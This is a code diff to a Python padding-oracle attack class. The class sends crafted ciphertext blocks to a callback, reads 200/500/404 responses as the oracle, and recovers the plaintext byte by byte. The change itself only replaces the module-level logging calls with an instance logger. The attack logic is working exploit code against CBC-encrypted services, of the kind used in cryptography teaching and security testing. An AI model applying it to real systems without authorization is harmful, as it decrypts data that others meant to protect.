@@ -11,11 +11,14 @@ class PaddingAttack(object):
     Perform a padding attack using a single block of crafted
     ciphertext
     """
-    def __init__(self, enc_block, IV, callback, blocklen=16):
+    def __init__(self, enc_block, IV, callback, blocklen=16, lvl=logging.INFO):
         self.enc_block = enc_block.decode("hex")
         self.IV = IV.decode("hex")
         self.callback = callback
         self.blocklen = blocklen
+        logging.basicConfig(level=lvl)
+        self.logger = logging.getLogger(__name__)
+
 
     def attack(self):
         intermediate_bytes = []
@@ -30,20 +33,20 @@ class PaddingAttack(object):
                 data += self.enc_block
                 return_code = self.callback(data.encode("hex"))
                 if return_code == 200:
-                    logging.log(logging.DEBUG, "[200] Valid decrpyption obtained.")
+                    self.logger.debug("[200] Valid decrpyption obtained.")
                 elif return_code == 500:
+                    #self.logger.debug("[500], invalid padding.")
                     continue
-                    logging.log(logging.DEBUG, "[500], invalid padding.")
                 elif return_code == 404:
-                    logging.log(logging.DEBUG, "[404], valid padding, invalid decryption.")
+                    self.logger.debug("[404], valid padding, invalid decryption.")
                     byte = pos ^ i
                     intermediate_bytes.insert(0, byte)
                     decrypted_bytes.insert(0, byte^ord(self.IV[-pos]))
-                    logging.log(logging.DEBUG, "Intermediate bytes found to be", intermediate_bytes)
-                    logging.log(logging.DEBUG, "Decrypted bytes so far", decrypted_bytes)
+                    self.logger.debug("Intermediate bytes found to be" + repr(intermediate_bytes))
+                    self.logger.debug("Decrypted bytes so far" + repr(decrypted_bytes))
                     break
             pos += 1
 
         decrypted_bytes = ''.join(map(chr, decrypted_bytes))
-        logging.log(logging.DEBUG, "Fully Decrypted data - ", decrypted_bytes)
+        self.logger.debug("Fully Decrypted data - " + repr(decrypted_bytes))
         return decrypted_bytes
